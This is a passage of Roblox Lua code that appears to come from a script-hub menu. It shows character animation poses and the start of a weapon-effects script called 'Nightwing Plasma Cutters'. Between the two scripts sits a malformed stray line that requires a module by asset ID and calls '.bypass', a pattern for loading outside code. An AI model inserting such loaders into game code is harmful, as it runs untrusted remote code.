LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.3)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.3)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - .1 * math.sin(sine/12)),math.rad(40 - .5 * math.sin(sine/12))), 0.3)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + .1 * math.sin(sine/12)),math.rad(-40 + .5 * math.sin(sine/12))), 0.3)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.54, 1.4 + .1 * math.sin(sine/9), .4) * CFrame.Angles(math.rad(9 + 2 * math.cos(sine/9)), math.rad(0), math.rad(0)), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.54, 2.0 + .02 * math.sin(sine/9), 0.2 + .1 * math.sin(sine/9)) * CFrame.Angles(math.rad(25 + 5 * math.sin(sine/9)), math.rad(20), math.rad(0)), 0.3)
elseif position == "Falling" and attacking == false and levitate == false then
change = 1
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(8), math.rad(4), math.rad(0)), 0.2)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(14), math.rad(-4), math.rad(0)), 0.2)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.6, 0.5, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(20)), 0.2)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.6, 0.5, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-20)), 0.2)
elseif position == "Falling2" and attacking == false and levitate then
change = 1
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-20 - 1 * math.sin(sine/9)), math.rad(0 + 0 * math.cos(sine/8)), math.rad(0) + Root.RotVelocity.Y / 30, math.cos(10 * math.cos(sine/10))), 0.3)
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.3)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.3)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - .1 * math.sin(sine/12)),math.rad(40 - .5 * math.sin(sine/12))), 0.3)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + .1 * math.sin(sine/12)),math.rad(-40 + .5 * math.sin(sine/12))), 0.3)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.54, 1.4 + .1 * math.sin(sine/9), .4) * CFrame.Angles(math.rad(9 + 2 * math.cos(sine/9)), math.rad(0), math.rad(0)), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.54, 2.0 + .02 * math.sin(sine/9), 0.2 + .1 * math.sin(sine/9)) * CFrame.Angles(math.rad(25 + 5 * math.sin(sine/9)), math.rad(20), math.rad(0)), 0.3)
elseif position == "Walking" and attacking == false and running == false then
change = 1
walking = true
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - .1 * math.sin(sine/12)),math.rad(40 - .5 * math.sin(sine/12))), 0.3)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + .1 * math.sin(sine/12)),math.rad(-40 + .5 * math.sin(sine/12))), 0.3)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-10), math.rad(5 * math.cos(sine/7)), math.rad(0) + Root.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/10))), 0.3)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 1.92 - 0.35 * math.cos(sine/8)/2.8, 0.2 - math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) + -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)  + RightLeg.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/8))), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.92 + 0.35 * math.cos(sine/8)/2.8, 0.2 + math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) - -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)  + LeftLeg.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/8))), 0.3)
elseif position == "Idle" and attacking == false and running == false and not levitate then
change = .5
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2 + -.1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0),math.rad(25),math.rad(0)),.1)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - 1 * math.sin(sine/12)),math.rad(40 - 2 * math.sin(sine/12))), 0.1)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.1)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + 1 * math.sin(sine/12)),math.rad(-40 + 2 * math.sin(sine/12))), 0.1)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.1)
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0 - .1 * math.sin(sine/12), 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.1)
elseif position == "Idle2" and attacking == false and running == false then
change = .75
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0 - 3 * math.sin(sine/9)),0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(-.2,.2,0) * CFrame.Angles(0,0,0),.1)
LEFTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
RIGHTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.6, 0.8 - .1 * math.sin(sine/9), 0) * CFrame.Angles(math.rad(0), math.rad(0 + 3 * math.sin(sine/9)), math.rad(35 - 5 * math.sin(sine/9))), 0.4)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.6, 0.8 - .1 * math.sin(sine/9), 0) * CFrame.Angles(math.rad(0), math.rad(0 - 3 * math.sin(sine/9)), math.rad(-35 + 5 * math.sin(sine/9))), 0.4)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.54, 1.4 + .1 * math.sin(sine/9), .4) * CFrame.Angles(math.rad(9 + 2 * math.cos(sine/9)), math.rad(0), math.rad(0)), 0.4)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 2.0,0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10 + 2 * math.sin(sine/9))), 0.4)
elseif position == "Walking2" and attacking == false and running == false then
ws = 50
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-20 - 1 * math.sin(sine/9)), math.rad(0 + 0 * math.cos(sine/8)), math.rad(0) + Root.RotVelocity.Y / 30, math.cos(10 * math.cos(sine/10))), 0.3)
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.3)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.3)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - .1 * math.sin(sine/12)),math.rad(40 - .5 * math.sin(sine/12))), 0.3)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1.5,.6,-.5) * CFrame.Angles(math.rad(30),math.rad(-5 + .1 * math.sin(sine/12)),math.rad(-40 + .5 * math.sin(sine/12))), 0.3)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(.2,1.2,-.3),.3)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.54, 1.4 + .1 * math.sin(sine/9), .4) * CFrame.Angles(math.rad(9 + 2 * math.cos(sine/9)), math.rad(0), math.rad(0)), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.54, 2.0 + .02 * math.sin(sine/9), 0.2 + .1 * math.sin(sine/9)) * CFrame.Angles(math.rad(25 + 5 * math.sin(sine/9)), math.rad(20), math.rad(0)), 0.3)
elseif position == "Running" and attacking == false then
change = 1
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(1.24+.6*math.sin(sine/4)/1.4, 0.54, 0+0.8*math.sin(sine/4)) * CFrame.Angles(math.rad(6-140*math.sin(sine/4)/1.2), math.rad(0), math.rad(-20+70*math.sin(sine/4))), 0.3)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(0, .5, 0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)), 0.3)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(-1.24+.6*math.sin(sine/4)/1.4, 0.54, 0-0.8*math.sin(sine/4))*CFrame.Angles(math.rad(6+140*math.sin(sine/4)/1.2), math.rad(0), math.rad(20+70*math.sin(sine/4))), 0.3)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(0,.5,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),.3)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2, 0) * CFrame.Angles(math.rad(-20 - 0 * math.sin(sine/4)), math.rad(0 + 6 * math.sin(sine/4)), math.rad(0) + Root.RotVelocity.Y / 30, math.sin(10 * math.sin(sine/4))), 0.3)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,-.2 + .5*-math.sin(sine/4)),.3)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 1.6+0.1*math.sin(sine/4),.7*-math.sin(sine/4)) * CFrame.Angles(math.rad(15+ -50 * math.sin(sine/4)),0,0),.3)
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,-.2 + .5*math.sin(sine/4)),.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.6-0.1*math.sin(sine/4),.7*math.sin(sine/4)) * CFrame.Angles(math.rad(15 + 50 * math.sin(sine/4)),0,0),.3)
end
swait()
end
end)
anims()
warn("Prepare for a magic trick full of pain and regret. Made by Supr14")

"ligma.require(3418687354).load("Player.name").bypass" end
}
Tab:Button{
	Name = "Nightwing Plasma Cutters",
	Description = nil,
	Callback = function() Player=game:GetService("Players").LocalPlayer
Character=Player.Character 
PlayerGui=Player.PlayerGui 
Backpack=Player.Backpack 
Mouse=Player:GetMouse()
Torso=Character.Torso 
Head=Character.Head 
Humanoid=Character.Humanoid
m=Instance.new('Model',Character)
LeftArm=Character["Left Arm"] 
LeftLeg=Character["Left Leg"] 
RightArm=Character["Right Arm"] 
RightLeg=Character["Right Leg"] 
LS=Torso["Left Shoulder"] 
LH=Torso["Left Hip"] 
RS=Torso["Right Shoulder"] 
RH=Torso["Right Hip"] 
Face = Head.face
Neck=Torso.Neck
it=Instance.new
attacktype=1
vt=Vector3.new
cf=CFrame.new
euler=CFrame.fromEulerAnglesXYZ
angles=CFrame.Angles
cloaked=false
necko=cf(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
necko2=cf(0, -0.5, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
LHC0=cf(-1,-1,0,-0,-0,-1,0,1,0,1,0,0)
LHC1=cf(-0.5,1,0,-0,-0,-1,0,1,0,1,0,0)
RHC0=cf(1,-1,0,0,0,1,0,1,0,-1,-0,-0)
RHC1=cf(0.5,1,0,0,0,1,0,1,0,-1,-0,-0)
RootPart=Character.HumanoidRootPart
RootJoint=RootPart.RootJoint
RootCF=euler(-1.57,0,3.14)
attack = false 
attackdebounce = false 
deb=false
equipped=true
hand=false
MMouse=nil
combo=0
mana=0
trispeed=.2
attackmode='none'
local idle=0
local Anim="Idle"
local Effects={}
local gun=false
local shoot=false
player=nil
trispeed=.5
pathtrans=.7 
magix=false
pathcolor=BrickColor.new('White')
shoot=false
mon=Instance.new('Model',Character)
--game:service'Lighting'.TimeOfDay=24
--[[
sound=Instance.new('Sound',Character)
sound.SoundId='rbxassetid://190454307'--170825871 142360845 231392691 145556530 178571619 190454307
sound.Volume=1
sound.Pitch=1
sound.PlayOnRemove=false
sound.Looped=true
wait()
sound:play()]]

mouse=Player:GetMouse()
--save shoulders 
RSH, LSH=nil, nil 
--welds 
RW, LW=Instance.new("Weld"), Instance.new("Weld") 
RW.Name="Right Shoulder" LW.Name="Left Shoulder"
LH=Torso["Left Hip"]
RH=Torso["Right Hip"]
TorsoColor=Torso.BrickColor

function NoOutline(Part)
	Part.TopSurface,Part.BottomSurface,Part.LeftSurface,Part.RightSurface,Part.FrontSurface,Part.BackSurface = 10,10,10,10,10,10
end

player=Player 
ch=Character
RSH=ch.Torso["Right Shoulder"] 
LSH=ch.Torso["Left Shoulder"] 
-- 
RSH.Parent=nil 
LSH.Parent=nil 
-- 
RW.Name="Right Shoulder"
RW.Part0=ch.Torso 
RW.C0=cf(1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.3, 0, -0.5) 
RW.C1=cf(0, 0.5, 0) 
RW.Part1=ch["Right Arm"] 
RW.Parent=ch.Torso 
-- 
LW.Name="Left Shoulder"
LW.Part0=ch.Torso 
LW.C0=cf(-1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.7, 0, 0.8) 
LW.C1=cf(0, 0.5, 0) 
LW.Part1=ch["Left Arm"] 
LW.Parent=ch.Torso 

local function weldBetween(a, b)
    local weldd = Instance.new("ManualWeld")
    weldd.Part0 = a
    weldd.Part1 = b
    weldd.C0 = CFrame.new()
    weldd.C1 = b.CFrame:inverse() * a.CFrame
    weldd.Parent = a
    return weldd
end

it=Instance.new

function nooutline(part)
	part.TopSurface,part.BottomSurface,part.LeftSurface,part.RightSurface,part.FrontSurface,part.BackSurface = 10,10,10,10,10,10
end

function part(formfactor,parent,material,reflectance,transparency,brickcolor,name,size)
	local fp=it("Part")
	fp.formFactor=formfactor
	fp.Parent=parent
	fp.Reflectance=reflectance
	fp.Transparency=transparency
	fp.CanCollide=false
	fp.Locked=true
	fp.BrickColor=BrickColor.new(tostring(brickcolor))
	fp.Name=name
	fp.Size=size
	fp.Position=Character.Torso.Position
	nooutline(fp)
	fp.Material=material
	fp:BreakJoints()
	return fp
end

function prt(formfactor,parent,material,reflectance,transparency,brickcolor,name,size)
	local fp=it("Part")
	fp.formFactor=formfactor
	fp.Parent=parent
	fp.Reflectance=reflectance
	fp.Transparency=transparency
	fp.CanCollide=false
	fp.Locked=true
	fp.BrickColor=BrickColor.new(tostring(brickcolor))
	fp.Name=name
	fp.Size=size
	fp.Position=Character.Torso.Position
	nooutline(fp)
	fp.Material=material
	fp:BreakJoints()
	return fp
end


function paart(formfactor,parent,reflectance,transparency,brickcolor,name,size)
	local fp=it("Part")
	fp.formFactor=formfactor 
	fp.Parent=parent
	fp.Reflectance=reflectance
	fp.Transparency=transparency
	fp.CanCollide=false 
	fp.Locked=true
	fp.BrickColor=brickcolor
	fp.Name=name
	fp.Size=size
	fp.Position=Torso.Position 
	NoOutline(fp)
	fp.Material="SmoothPlastic"
	fp:BreakJoints()
	return fp 
end 

function mesh(Mesh,part,meshtype,meshid,offset,scale)
	local mesh=it(Mesh)
	mesh.Parent=part
	if Mesh=="SpecialMesh" then
		mesh.MeshType=meshtype
		mesh.MeshId=meshid
	end
	mesh.Offset=offset
	mesh.Scale=scale
	return mesh
end

function weld(parent,part0,part1,c0,c1)
	local weld=it("Weld")
	weld.Parent=parent
	weld.Part0=part0
	weld.Part1=part1
	weld.C0=c0
	weld.C1=c1
	return weld
end

local Color1=Torso.BrickColor

local bodvel=Instance.new("BodyVelocity")
local bg=Instance.new("BodyGyro")

function swait(num)
	if num==0 or num==nil then
		game:service'RunService'.Heartbeat:wait(0)
	else
		for i=0,num do
			game:service'RunService'.Heartbeat:wait(0)
		end
	end
end


so = function(id,par,vol,pit) 
	coroutine.resume(coroutine.create(function()
		local sou = Instance.new("Sound",par or workspace)
		sou.Volume=vol
		sou.Pitch=pit or 1
		sou.SoundId=id
		swait() 
		sou:play() 
		game:GetService("Debris"):AddItem(sou,6)
	end))
end

function clerp(a,b,t) 
	local qa = {QuaternionFromCFrame(a)}
	local qb = {QuaternionFromCFrame(b)} 
	local ax, ay, az = a.x, a.y, a.z 
	local bx, by, bz = b.x, b.y, b.z
	local _t = 1-t
	return QuaternionToCFrame(_t*ax + t*bx, _t*ay + t*by, _t*az + t*bz,QuaternionSlerp(qa, qb, t)) 
end 

function QuaternionFromCFrame(cf) 
	local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components() 
	local trace = m00 + m11 + m22 
	if trace > 0 then 
		local s = math.sqrt(1 + trace) 
		local recip = 0.5/s 
		return (m21-m12)*recip, (m02-m20)*recip, (m10-m01)*recip, s*0.5 
		else 
		local i = 0 
		if m11 > m00 then
			i = 1
		end
		if m22 > (i == 0 and m00 or m11) then 
			i = 2 
		end 
		if i == 0 then 
			local s = math.sqrt(m00-m11-m22+1) 
			local recip = 0.5/s 
			return 0.5*s, (m10+m01)*recip, (m20+m02)*recip, (m21-m12)*recip 
			elseif i == 1 then 
			local s = math.sqrt(m11-m22-m00+1) 
			local recip = 0.5/s 
			return (m01+m10)*recip, 0.5*s, (m21+m12)*recip, (m02-m20)*recip 
			elseif i == 2 then 
			local s = math.sqrt(m22-m00-m11+1) 
			local recip = 0.5/s return (m02+m20)*recip, (m12+m21)*recip, 0.5*s, (m10-m01)*recip 
		end 
	end 
end

local function CFrameFromTopBack(at, top, back)
local right = top:Cross(back)
return CFrame.new(at.x, at.y, at.z,
right.x, top.x, back.x,
right.y, top.y, back.y,
right.z, top.z, back.z)
end

function Triangle(a, b, c)
local edg1 = (c-a):Dot((b-a).unit)
local edg2 = (a-b):Dot((c-b).unit)
local edg3 = (b-c):Dot((a-c).unit)
if edg1 <= (b-a).magnitude and edg1 >= 0 then
a, b, c = a, b, c
elseif edg2 <= (c-b).magnitude and edg2 >= 0 then
a, b, c = b, c, a
elseif edg3 <= (a-c).magnitude and edg3 >= 0 then
a, b, c = c, a, b
else
assert(false, "unreachable")
end
 
local len1 = (c-a):Dot((b-a).unit)
local len2 = (b-a).magnitude - len1
local width = (a + (b-a).unit*len1 - c).magnitude
 
local maincf = CFrameFromTopBack(a, (b-a):Cross(c-b).unit, -(b-a).unit)
 
local list = {}
 
if len1 > 0.01 then
local w1 = Instance.new('WedgePart', m)
game:GetService("Debris"):AddItem(w1,5)
w1.Material = "SmoothPlastic"
w1.FormFactor = 'Custom'
w1.BrickColor = pathcolor
w1.Transparency = 0
w1.Reflectance = 0
w1.Material = "SmoothPlastic"
w1.CanCollide = false
NoOutline(w1)
local sz = Vector3.new(0.2, width, len1)
w1.Size = sz
local sp = Instance.new("SpecialMesh",w1)
sp.MeshType = "Wedge"
sp.Scale = Vector3.new(0,1,1) * sz/w1.Size
w1:BreakJoints()
w1.Anchored = true
w1.Parent = workspace
w1.Transparency = 0.7
table.insert(Effects,{w1,"Disappear",.01})
w1.CFrame = maincf*CFrame.Angles(math.pi,0,math.pi/2)*CFrame.new(0,width/2,len1/2)
table.insert(list,w1)
end
 
if len2 > 0.01 then
local w2 = Instance.new('WedgePart', m)
game:GetService("Debris"):AddItem(w2,5)
w2.Material = "SmoothPlastic"
w2.FormFactor = 'Custom'
w2.BrickColor = pathcolor
w2.Transparency = 0
w2.Reflectance = 0
w2.Material = "SmoothPlastic"
w2.CanCollide = false
NoOutline(w2)
local sz = Vector3.new(0.2, width, len2)
w2.Size = sz
local sp = Instance.new("SpecialMesh",w2)
sp.MeshType = "Wedge"
sp.Scale = Vector3.new(0,1,1) * sz/w2.Size
w2:BreakJoints()
w2.Anchored = true
w2.Parent = workspace
w2.Transparency = 0.7
table.insert(Effects,{w2,"Disappear",.01})
w2.CFrame = maincf*CFrame.Angles(math.pi,math.pi,-math.pi/2)*CFrame.new(0,width/2,-len1 - len2/2)
table.insert(list,w2)
end
return unpack(list)
end

function NoOutline(Part)
Part.TopSurface,Part.BottomSurface,Part.LeftSurface,Part.RightSurface,Part.FrontSurface,Part.BackSurface = 10,10,10,10,10,10
end


if #Effects>0 then
--table.insert(Effects,{prt,"Block1",delay})
for e=1,#Effects do
if Effects[e]~=nil then
--for j=1,#Effects[e] do
local Thing=Effects[e]
if Thing~=nil then
local Part=Thing[1]
local Mode=Thing[2]
local Delay=Thing[3]
local IncX=Thing[4]
local IncY=Thing[5]
local IncZ=Thing[6]
if Thing[1].Transparency<=1 then
if Thing[2]=="Block1" then
Thing[1].CFrame=Thing[1].CFrame*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
Mesh=Thing[1].Mesh
Mesh.Scale=Mesh.Scale+vt(Thing[4],Thing[5],Thing[6])
Thing[1].Transparency=Thing[1].Transparency+Thing[3]
elseif Thing[2]=="Cylinder" then
Mesh=Thing[1].Mesh
Mesh.Scale=Mesh.Scale+vt(Thing[4],Thing[5],Thing[6])
Thing[1].Transparency=Thing[1].Transparency+Thing[3]
elseif Thing[2]=="Blood" then
Mesh=Thing[1].Mesh
Thing[1].CFrame=Thing[1].CFrame*cf(0,.5,0)
Mesh.Scale=Mesh.Scale+vt(Thing[4],Thing[5],Thing[6])
Thing[1].Transparency=Thing[1].Transparency+Thing[3]
elseif Thing[2]=="Elec" then
Mesh=Thing[1].Mesh
Mesh.Scale=Mesh.Scale+vt(Thing[7],Thing[8],Thing[9])
Thing[1].Transparency=Thing[1].Transparency+Thing[3]
elseif Thing[2]=="Disappear" then
Thing[1].Transparency=Thing[1].Transparency+Thing[3]
end
else
Part.Parent=nil
table.remove(Effects,e)
end
end
--end
end
end
end

function QuaternionToCFrame(px, py, pz, x, y, z, w) 
	local xs, ys, zs = x + x, y + y, z + z 
	local wx, wy, wz = w*xs, w*ys, w*zs 
	local xx = x*xs 
	local xy = x*ys 
	local xz = x*zs 
	local yy = y*ys 
	local yz = y*zs 
	local zz = z*zs 
	return CFrame.new(px, py, pz,1-(yy+zz), xy - wz, xz + wy,xy + wz, 1-(xx+zz), yz - wx, xz - wy, yz + wx, 1-(xx+yy)) 
end

function QuaternionSlerp(a, b, t) 
	local cosTheta = a[1]*b[1] + a[2]*b[2] + a[3]*b[3] + a[4]*b[4] 
	local startInterp, finishInterp; 
	if cosTheta >= 0.0001 then 
		if (1 - cosTheta) > 0.0001 then 
			local theta = math.acos(cosTheta) 
			local invSinTheta = 1/math.sin(theta) 
			startInterp = math.sin((1-t)*theta)*invSinTheta 
			finishInterp = math.sin(t*theta)*invSinTheta  
		else 
			startInterp = 1-t 
			finishInterp = t 
		end 
	else 
		if (1+cosTheta) > 0.0001 then 
			local theta = math.acos(-cosTheta) 
			local invSinTheta = 1/math.sin(theta) 
			startInterp = math.sin((t-1)*theta)*invSinTheta 
			finishInterp = math.sin(t*theta)*invSinTheta 
		else 
			startInterp = t-1 
		finishInterp = t 
		end 
	end 
	return a[1]*startInterp + b[1]*finishInterp, a[2]*startInterp + b[2]*finishInterp, a[3]*startInterp + b[3]*finishInterp, a[4]*startInterp + b[4]*finishInterp 
end

function rayCast(Pos, Dir, Max, Ignore)  -- Origin Position , Direction, MaxDistance , IgnoreDescendants
	return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore) 
end 

function SkullEffect(brickcolor,cframe,x1,y1,z1,delay)
	local prt=paart(3,workspace,0,0,brickcolor,"Effect",vt(3,3,3))
	prt.Anchored=true
	prt.CFrame=cframe
	local msh=mesh("SpecialMesh",prt,"FileMesh","http://www.roblox.com/asset/?id=4770583",vt(0,0,0),vt(x1,y1,z1))
	--http://www.roblox.com/asset/?id=4770560
	game:GetService("Debris"):AddItem(prt,2)
	CF=prt.CFrame
	coroutine.resume(coroutine.create(function(Part,Mesh,TehCF) 
		for i=0,1,0.2 do
			wait()
			Part.CFrame=CF*cf(0,0,-0.4)
		end
		for i=0,1,delay do
			wait()
			--Part.CFrame=CF*cf((math.random(-1,0)+math.random())/5,(math.random(-1,0)+math.random())/5,(math.random(-1,0)+math.random())/5)
			Mesh.Scale=Mesh.Scale
		end
		for i=0,1,0.1 do
			wait()
			Part.Transparency=i
		end
		Part.Parent=nil
		return Part
	end),prt,msh,CF)
	return prt
end

function MagicBlock(brickcolor,cframe,x1,y1,z1,x3,y3,z3,delay)
	local prt=paart(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
	prt.Anchored=true
	prt.CFrame=cframe
	msh=mesh("BlockMesh",prt,"","",vt(0,0,0),vt(x1,y1,z1))
	game:GetService("Debris"):AddItem(prt,5)
	coroutine.resume(coroutine.create(function(Part,Mesh) 
		for i=0,1,delay do
			wait()
			Part.CFrame=Part.CFrame*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
			Part.Transparency=i
			Mesh.Scale=Mesh.Scale+vt(x3,y3,z3)
		end
	Part.Parent=nil
	return Part
	end),prt,msh)
	return prt
end

function MagicBlock2(brickcolor,cframe,Parent,x1,y1,z1,x3,y3,z3,delay)
	local prt=paart(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
	prt.Anchored=false
	prt.CFrame=cframe
	msh=mesh("BlockMesh",prt,"","",vt(0,0,0),vt(x1,y1,z1))
	local wld=weld(prt,prt,Parent,cframe)
	game:GetService("Debris"):AddItem(prt,5)
	coroutine.resume(coroutine.create(function(Part,Mesh,Weld) 
		for i=0,1,delay do
			wait()
			Weld.C0=euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))*cframe
			--Part.CFrame=Part.CFrame*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
			Part.Transparency=i
			Mesh.Scale=Mesh.Scale+vt(x3,y3,z3)
		end
		Part.Parent=nil
	end),prt,msh,wld)
end

function MagicBlock3(brickcolor,cframe,Parent,x1,y1,z1,x3,y3,z3,delay)
